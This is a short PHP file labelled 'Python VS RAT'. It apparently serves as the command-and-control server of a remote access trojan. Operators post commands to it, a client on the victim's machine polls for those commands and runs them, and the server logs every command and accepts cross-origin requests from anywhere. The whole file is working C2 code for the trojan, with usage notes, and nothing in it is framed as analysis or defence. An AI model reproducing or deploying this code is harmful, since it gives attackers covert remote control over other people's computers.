<?php 
    /**
     * @Author: InformaticageNJP
     * @Title: Python VS RAT
     * @Date: 15/07/2018
     * @Licence: MIT
     * 
     * @Description:
     * Simple database-less server that handles simple requests
     * that serve the purpose of storing and reading inst\ructions 
     * to be executed from a third party software, 
     * and if any, storing the response.
     * 
     * @Usage:
     * To read command ( Can not find error if empty )
     * http://server_address.com/command/
     * or
     * http://server_address.com/command/index.php
     *
     * To write command:
     * http://server_address.com/command/   ** DATA TO SEND IN POST
     * or
     * http://server_address.com/command/index.php   **  DATA TO SEND IN POST
     * 
     * 
     * To read response ( Can not find error if empty )
     * http://server_address.com/response/
     * or
     * http://server_address.com/response/index.php
     *
     * To write response:
     * http://server_address.com/command/   ** DATA TO SEND IN POST
     * or
     * http://server_address.com/command/index.php   ** DATA TO SEND IN POST
     */

    // Cors to allow usage by applications 
    header("Access-Control-Allow-Origin: *");

    // Cors to define plain text as output
    header('Content-Type: text/plain');
    
    // Definitions of file name and path to store data
    define("COMMAND_STORAGE", "db_command");
    define("RESPONSE_STORAGE", "db_response");
    define("LOG", "log");

    if (file_get_contents('php://input')) {
    // Request received 
        file_put_contents(COMMAND_STORAGE, mb_convert_encoding(file_get_contents('php://input'), "UTF-8"));
        file_put_contents(LOG, mb_convert_encoding(file_get_contents('php://input'), "UTF-8") . PHP_EOL, FILE_APPEND);
    } else {
        // No request received
        if(file_exists(COMMAND_STORAGE)) {
            // db not empty
            echo (file_get_contents(COMMAND_STORAGE));
        } else {
            echo ("Can not find " . COMMAND_STORAGE);
        }
    } 
?>